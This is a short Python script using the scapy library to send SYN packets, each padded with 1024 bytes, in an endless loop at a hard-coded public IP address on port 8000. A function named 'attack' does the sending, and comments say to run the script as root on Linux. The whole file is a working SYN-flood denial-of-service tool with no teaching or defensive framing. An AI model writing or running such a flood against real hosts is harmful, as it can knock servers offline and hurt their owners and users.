from scapy.all import IP, TCP, send, Raw

# make sure this script is
# - run as root
# - run on a linux machine
ip = IP(dst="3.82.232.137")
tcp = TCP(dport=8000, flags="S")
body = Raw(b"X" * 1024)


def attack():
    p = ip / tcp / body
    send(p, loop=1, verbose=0)


if __name__ == "__main__":
    attack()
